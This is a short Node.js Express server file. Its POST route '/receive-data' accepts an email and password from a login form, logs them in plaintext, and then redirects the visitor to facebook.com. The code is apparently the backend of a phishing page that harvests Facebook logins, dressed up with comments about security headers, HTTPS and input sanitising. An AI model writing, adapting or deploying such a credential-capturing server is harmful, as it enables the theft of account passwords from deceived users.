const express = require('express'); const path = require('path'); const helmet = require('helmet'); // For security headers const bodyParser = require('body-parser'); const app = express(); const PORT = process.env.PORT || 3000; // Middleware for security headers app.use(helmet()); // Body parser to handle form data app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: true })); // Serve static files from the 'public' directory app.use(express.static(path.join(__dirname, 'public'))); // Force HTTPS (Redirect to HTTPS if HTTP is used) app.use((req, res, next) => { if (req.headers['x-forwarded-proto'] !== 'https') { return res.redirect(['https://', req.get('Host'), req.url].join('')); } next(); }); // Route to handle login form data app.post('/receive-data', (req, res) => { const { email, pass } = req.body; // Sanitize inputs (basic) if (!email || !pass) { return res.status(400).send('Invalid input'); } console.log(`Received email: ${email}, password: ${pass}`); // Redirect to an external site or another route res.redirect('https://www.facebook.com'); }); // Serve the index.html file for the root route app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); }); // Start the server app.listen(PORT, () => { console.log(`Server running on port ${PORT}`); });
